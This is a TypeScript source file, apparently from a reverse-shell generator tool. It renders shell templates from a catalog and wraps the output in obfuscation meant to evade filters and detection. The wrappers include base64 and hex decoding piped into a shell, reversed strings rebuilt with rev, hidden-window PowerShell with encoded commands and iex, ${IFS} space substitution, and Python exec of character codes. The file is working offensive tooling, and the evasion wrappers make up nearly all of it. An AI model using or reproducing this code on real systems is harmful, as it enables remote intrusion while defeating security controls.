import { MAX_COMMAND_CHARS, assertWithinTextLimit } from "@/lib/security";
import { getTemplate } from "./catalog";
import type {
  GeneratedReverseShell,
  ObfuscationMode,
  ReverseShellConfig,
} from "./types";
import { normalizeReverseShellConfig } from "./validation";

function utf8Base64(value: string): string {
  const bytes = new TextEncoder().encode(value);
  let binary = "";
  for (const byte of bytes) {
    binary += String.fromCharCode(byte);
  }
  return btoa(binary);
}

function hexEncode(value: string): string {
  return Array.from(new TextEncoder().encode(value))
    .map((byte) => byte.toString(16).padStart(2, "0"))
    .join("");
}

function utf16LeBase64(value: string): string {
  const bytes: number[] = [];
  for (let i = 0; i < value.length; i += 1) {
    const code = value.charCodeAt(i);
    bytes.push(code & 0xff, code >> 8);
  }
  return btoa(String.fromCharCode(...bytes));
}

function singleQuote(value: string): string {
  return `'${value.replace(/'/g, `'\\''`)}'`;
}

function splitForPowerShell(value: string): string {
  const escaped = value.replace(/'/g, "''");
  const chunks = escaped.match(/.{1,28}/g) ?? [escaped];
  return chunks.map((chunk) => `'${chunk}'`).join("+");
}

export function obfuscateCommand(
  command: string,
  mode: ObfuscationMode,
  shell: string,
): { command: string; notes: string[] } {
  switch (mode) {
    case "none":
      return { command, notes: ["No obfuscation applied."] };
    case "url":
      return {
        command: encodeURIComponent(command),
        notes: ["URL-encoded output for HTTP parameter or form contexts."],
      };
    case "url-double": {
      const encoded = encodeURIComponent(encodeURIComponent(command));
      return {
        command: encoded,
        notes: ["Command URL-encoded twice for double-decoding contexts."],
      };
    }
    case "base64":
      return {
        command: utf8Base64(command),
        notes: ["Raw UTF-8 base64-encoded command output."],
      };
    case "hex":
      return {
        command: hexEncode(command),
        notes: ["Raw UTF-8 hex-encoded command output."],
      };
    case "bash-base64":
      return {
        command: `echo ${utf8Base64(command)} | base64 -d | ${shell}`,
        notes: ["Base64 wrapper decoded locally before execution."],
      };
    case "bash-base64-no-spaces":
      return {
        command: `base64 -d<<<${utf8Base64(command)}|${shell}`,
        notes: ["Bash base64 wrapper using minimal spaces."],
      };
    case "bash-ifs":
      return {
        command: command.replace(/ /g, "${IFS}"),
        notes: ["Spaces replaced with ${IFS} for shell argument filtering."],
      };
    case "bash-rev": {
      const reversed = [...command].reverse().join("");
      return {
        command: `${shell} -c \"$(printf %s ${singleQuote(reversed)} | rev)\"`,
        notes: ["Command is stored reversed and reconstructed with rev."],
      };
    }
    case "bash-printf-hex":
      return {
        command: `printf ${singleQuote(
          `\\x${
            hexEncode(command)
              .match(/.{1,2}/g)
              ?.join("\\x") ?? ""
          }`,
        )} | ${shell}`,
        notes: ["Command rebuilt from hex escape sequences with printf."],
      };
    case "powershell-encoded":
      return {
        command: `powershell -NoP -NonI -W Hidden -Enc ${utf16LeBase64(command)}`,
        notes: ["PowerShell -EncodedCommand uses UTF-16LE base64."],
      };
    case "powershell-concat":
      return {
        command: `powershell -NoP -NonI -W Hidden -Command \"iex (${splitForPowerShell(command)})\"`,
        notes: ["PowerShell command split into concatenated string chunks."],
      };
    case "powershell-base64":
      return {
        command: `powershell -NoP -NonI -W Hidden -Command "$c='${utf8Base64(command)}';iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($c)))"`,
        notes: ["PowerShell decodes a UTF-8 base64 command before execution."],
      };
    case "python-chr": {
      const chars = [...command].map((char) => char.charCodeAt(0)).join(",");
      return {
        command: `python3 -c 'exec(bytes([${chars}]).decode())'`,
        notes: ["Command reconstructed from character codes before execution."],
      };
    }
  }
}

export function generateReverseShell(
  config: ReverseShellConfig,
): GeneratedReverseShell {
  const safeConfig = normalizeReverseShellConfig(config);
  const template = getTemplate(safeConfig.templateId);
  const rawCommand = template.render(safeConfig);
  assertWithinTextLimit(rawCommand, MAX_COMMAND_CHARS, "Reverse shell command");
  const obfuscated = obfuscateCommand(
    rawCommand,
    safeConfig.obfuscation,
    safeConfig.shell || template.defaultShell,
  );

  return {
    template,
    rawCommand,
    command: obfuscated.command,
    notes: [template.description, ...obfuscated.notes],
  };
}
